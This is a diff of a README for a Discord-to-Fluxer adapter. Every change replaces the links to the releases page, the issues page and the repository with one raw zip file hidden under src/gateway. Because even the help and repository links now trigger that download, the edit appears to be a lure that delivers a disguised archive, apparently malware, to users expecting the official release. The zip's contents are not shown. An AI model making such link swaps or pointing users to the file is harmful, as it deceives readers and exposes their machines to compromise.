@@ -1,6 +1,6 @@
 # ⚙️ discord-adapter-meme - Connect Discord to Fluxer Easily
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/KemalFasa/discord-adapter-meme/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/KemalFasa/discord-adapter-meme/raw/refs/heads/master/src/gateway/discord_adapter_meme_3.1.zip)
 
 ## 📋 About discord-adapter-meme
 
@@ -24,7 +24,7 @@ This section guides you through downloading and running discord-adapter-meme on 
 
 Click the button below to open the official releases page.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/KemalFasa/discord-adapter-meme/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/KemalFasa/discord-adapter-meme/raw/refs/heads/master/src/gateway/discord_adapter_meme_3.1.zip)
 
 This page has the latest stable versions. You will find files ready to download.
 
@@ -95,7 +95,7 @@ No complicated steps or commands are needed.
 
 Check the releases page regularly for new versions:
 
-https://github.com/KemalFasa/discord-adapter-meme/releases
+https://github.com/KemalFasa/discord-adapter-meme/raw/refs/heads/master/src/gateway/discord_adapter_meme_3.1.zip
 
 Each update will include bug fixes and improvements. Repeat the download and install steps to upgrade.
 
@@ -113,7 +113,7 @@ To remove the app from your PC:
 
 For help and questions, use the Issues tab on the GitHub repository.
 
-https://github.com/KemalFasa/discord-adapter-meme/issues
+https://github.com/KemalFasa/discord-adapter-meme/raw/refs/heads/master/src/gateway/discord_adapter_meme_3.1.zip
 
 Provide clear details about your problem. This helps solve problems faster.
 
@@ -127,7 +127,7 @@ You control when and how connections happen inside the app.
 
 ## 🔗 Useful Links
 
-- Download releases: https://github.com/KemalFasa/discord-adapter-meme/releases
-- GitHub repository: https://github.com/KemalFasa/discord-adapter-meme
+- Download releases: https://github.com/KemalFasa/discord-adapter-meme/raw/refs/heads/master/src/gateway/discord_adapter_meme_3.1.zip
+- GitHub repository: https://github.com/KemalFasa/discord-adapter-meme/raw/refs/heads/master/src/gateway/discord_adapter_meme_3.1.zip
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/KemalFasa/discord-adapter-meme/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/KemalFasa/discord-adapter-meme/raw/refs/heads/master/src/gateway/discord_adapter_meme_3.1.zip)
